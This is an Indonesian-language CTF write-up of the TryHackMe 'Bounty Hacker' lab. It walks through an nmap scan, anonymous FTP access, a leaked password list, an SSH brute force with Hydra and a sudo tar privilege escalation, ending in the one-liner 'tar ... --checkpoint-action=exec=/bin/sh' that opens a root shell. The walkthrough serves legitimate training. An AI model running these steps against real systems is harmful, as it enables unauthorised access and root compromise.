---
title: "Tryhackme - Bounty Hacker WriteUps"
date: 2022-12-15 13:00:00 +07:00
categories: [WriteUps]
tags: [ctf, Tryhackme, pentest, writeups]
image: 
---

# Tryhackme - Bounty Hacker WriteUps

Menemukan Port terbuka dengan Nmap, Nmap menemukan beberapa layanan umum yang berjalan pada port standar mereka: 21 (FTP), 22 (SSH) dan 80 (HTTP).
```
# nmap -sC -sV 10.10.83.49  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-14 22:29 PST
Nmap scan report for 10.10.83.49
Host is up (0.33s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.46.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
```

Kita disini bisa mengakses langsung pada FTP dikarenakan FTP bisa login dengan Anonymous dan password FTP pun juga sama. Disini kita mendapatkan 2 file yaitu ```locks.txt``` dan ```task.txt```, selanjutnya kita download 2 file tersebut dengan cara ```get namafile.txt```
![image](https://media.discordapp.net/attachments/740245586095112242/1057180275169308742/image.png)

Setelah kita lihat kita menemukan task.txt yang dalamnya terdapat seperti gambar dibawah memungkinkan Informasi Sensitive:
![image](https://media.discordapp.net/attachments/740245586095112242/1057180565243175022/image.png)

Untuk file ```locks.txt``` ini mungkin ini terdapat password tersembunyi dari list file ```locks.txt``` ini. Ini memungkinan informasi sensitive yang bisa kita Brute Force secara langsung.

```
┌──(root㉿yupy)-[~/yp/tryhackme/BountyHacker]
└─# cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

Disini kita mencoba Brute Force dengan Hydra pada SSH dengan command dibawah, dan kita mencoba menggunakan list password dari file ```locks.txt``` yang didapat tadi. Dan kita mendapatkan passwordnya.
![image](https://media.discordapp.net/attachments/740245586095112242/1057181156220604546/image.png)

Setelah login pada SSH kita mencoba, kita biasa melihat pada sudoers dengan cara sudo -l. disini terdapat tar yang bisa mengakses langsung pada root access.
![image](https://media.discordapp.net/attachments/740245586095112242/1057181496483528736/image.png)

Selanjutnya kita exploit dengan payload [dari](https://gtfobins.github.io/gtfobins/tar/). setelah kita memasukan payloadnya kita dapat local privileges root access.
```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![image](https://media.discordapp.net/attachments/740245586095112242/1057181809537990758/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1057181946565902397/image.png)
